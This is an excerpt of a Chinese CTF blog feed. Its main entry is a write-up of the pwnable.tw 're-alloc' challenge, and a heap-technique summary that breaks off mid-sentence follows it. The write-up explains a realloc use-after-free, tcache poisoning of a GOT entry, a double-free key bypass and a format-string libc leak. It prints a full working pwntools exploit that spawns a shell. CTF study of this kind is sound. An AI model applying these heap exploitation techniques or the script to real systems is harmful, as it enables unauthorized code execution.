    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;CTF题目中经常会给出libc的文件，首先需要做的就是确定libc的版本，对程序进行针对性的攻击。最直接的确定方法就是直接运行该libc&lt;code&gt;./libc.so.6&lt;/code&gt;，但通常由于本机ld版本与libc版本不匹配，发生段错误。&lt;/p&gt;
&lt;p&gt;确定完大版本号还不够，因为就算是同一版本的libc也会有较大的变动。比方说，与最开始的2.29版本相比，gnu libc库的release/2.29/master分支的&lt;code&gt;tcache_perthread_struct-&amp;gt;counts&lt;/code&gt;的变量类型都变了；&lt;code&gt;__libc_malloc&lt;/code&gt;中取用tcache的判定，也由判断指针是否为空变成了判断counts是否大于0。这些细节很大程度上影响了exploit的书写。&lt;/p&gt;
&lt;p&gt;下面以pwnable.tw re-alloc的&lt;a href=&quot;https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc/libc.so.6&quot;&gt;libc&lt;/a&gt;为例，写一写我的经验。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw re-alloc</title>
    <link href="http://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/"/>
    <id>http://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/</id>
    <published>2020-08-07T14:11:47.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>是一个典型的菜单类程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊      RE Allocator      🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   1. Alloc               $</span><br><span class="line">$   2. Realloc             $</span><br><span class="line">$   3. Free                $</span><br><span class="line">$   4. Exit                $</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br></pre></td></tr></table></figure><ol><li>Alloc: index只能取0或1；size必须&lt;=0x78；然后使用<code>realloc(0, size)</code>分配，通过源码可以看出，这就相当于<code>malloc(size)</code>。这里存在null byte overflow（然而没什么用似乎，一开始我一直卡在这里想如何利用，完全没注意到后一个漏洞。。。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line"><span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br></pre></td></tr></table></figure><ol start="2"><li>Realloc: size同样&lt;=0x78。realloc有几种情况：请求大小自己可以满足；尝试向后扩展(top chunk或!inuse (next))；<code>__int_malloc</code>请求新块。（这里存在UAF，输入size为0</li><li>Free：<code>realloc(ptr, 0)</code>相当于<code>free(ptr)</code>，同时将指针数组置空。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>libc_version: glibc 2.29 with tcache。该版本libc的<a href="https://launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2">源码</a>。下一篇文章说一下如何确定的libc版本，如何确定的有tcache，以及如何使用指定libc运行程序。</p><p>此外，这个版本中出现了对tcache double free的一个<a href="https://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/#fastbin-dup">检查机制</a>。</p><a id="more"></a><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>用类似fastbin attack的方式伪造tcache，将atoll_got放入到两个大小的tcache链表上。</p><p>第一次利用其中一个将期修改为printf_got，在<code>read_long</code>中构造format string vulnerability，泄露栈上的<code>__libc_start_main</code>地址，也就是main函数的返回地址。</p><p>第二次将atoll_got修改为system地址，输入/bin/sh执行。</p><h2 id="伪造tcache-chunk"><a href="#伪造tcache-chunk" class="headerlink" title="伪造tcache chunk"></a>伪造tcache chunk</h2><p>只要满足以下条件就会使用tcache，可以发现并没有对counts进行检查，只要非空就会进行分配。同样<code>tcache_get</code>里也只是<code>--(tcache-&gt;counts[tc_idx])</code>，没有检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)                 <span class="comment"># free</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))  <span class="comment"># 修改next</span></span><br><span class="line">allocate(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)            <span class="comment"># 重新分配出来，使得atoll_got打头，此时counts=0，但并不妨碍</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>)             <span class="comment"># 使其向后扩展，从top chunk中切割</span></span><br><span class="line">free(<span class="number">0</span>)                           <span class="comment"># 第一次放进0x30 tcache</span></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)        <span class="comment"># 覆盖key，绕过double free检查</span></span><br><span class="line">free(<span class="number">1</span>)                           <span class="comment"># 第二次放进0x30 tcache</span></span><br></pre></td></tr></table></figure><p>用同样的方法，再伪造一个</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>atoll_got修改为printf_plt，构造format string vulnerability</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0</span>, <span class="number">0x18</span>, p64(printf_plt))        <span class="comment"># 修改atoll_got为printf_plt</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;Z%23$llx\n&quot;</span>)  <span class="comment"># 泄露 __libc_start_main</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Z&quot;</span>)</span><br><span class="line">libc_base = int(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0x26B6B</span></span><br></pre></td></tr></table></figure><p>修改atoll_got为system，get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b read_long&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;A\x00&quot;</span>)       <span class="comment"># 相当于输入1</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="string">&quot;%55x&quot;</span>)         <span class="comment"># 相当于输入0x38</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./re-alloc&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    atoll_got = elf.got[<span class="string">&quot;atoll&quot;</span>]</span><br><span class="line">    printf_plt = elf.plt[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    system_off = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(atoll_got))</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x18</span>, p64(printf_plt))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;Z%23$llx\n&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Z&quot;</span>)</span><br><span class="line">    libc_base = int(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0x26B6B</span></span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line">    system_addr = libc_base + system_off</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b read_long&quot;)</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;A\x00&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="string">&quot;%55x&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li><a href="https://n0nop.com/2020/03/06/pwn-heap-re-alloc/">https://n0nop.com/2020/03/06/pwn-heap-re-alloc/</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x400000)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;是一个典型的菜单类程序&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;🍊      RE Allocator      🍊&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   1. Alloc               $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   2. Realloc             $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   3. Free                $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   4. Exit                $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$$$$$$$$$$$$$$$$$$$$$$$$$$$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;Alloc: index只能取0或1；size必须&amp;lt;=0x78；然后使用&lt;code&gt;realloc(0, size)&lt;/code&gt;分配，通过源码可以看出，这就相当于&lt;code&gt;malloc(size)&lt;/code&gt;。这里存在null byte overflow（然而没什么用似乎，一开始我一直卡在这里想如何利用，完全没注意到后一个漏洞。。。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* realloc of null is supposed to be same as malloc */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (oldmem == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; __libc_malloc (bytes);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;Realloc: size同样&amp;lt;=0x78。realloc有几种情况：请求大小自己可以满足；尝试向后扩展(top chunk或!inuse (next))；&lt;code&gt;__int_malloc&lt;/code&gt;请求新块。（这里存在UAF，输入size为0&lt;/li&gt;
&lt;li&gt;Free：&lt;code&gt;realloc(ptr, 0)&lt;/code&gt;相当于&lt;code&gt;free(ptr)&lt;/code&gt;，同时将指针数组置空。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (bytes == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; oldmem != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __libc_free (oldmem); &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;libc_version: glibc 2.29 with tcache。该版本libc的&lt;a href=&quot;https://launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2&quot;&gt;源码&lt;/a&gt;。下一篇文章说一下如何确定的libc版本，如何确定的有tcache，以及如何使用指定libc运行程序。&lt;/p&gt;
&lt;p&gt;此外，这个版本中出现了对tcache double free的一个&lt;a href=&quot;https://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/#fastbin-dup&quot;&gt;检查机制&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>How2heap总结</title>
    <link href="http://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/"/>
    <id>http://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/</id>
    <published>2020-08-01T11:36:10.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h2><p>如果一个chunk可用且足够大，那么就会使用这个chunk。</p><h2 id="calc-tcache-idx"><a href="#calc-tcache-idx" class="headerlink" title="calc_tcache_idx"></a>calc_tcache_idx</h2><p>tcache(thread local caching)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br></pre></td></tr></table></figure><p>tcache拥有和fastbin差不多的结构。默认情况下，64个bin，每个bin最多7个chunk</p><p>64bit: <code>IDX 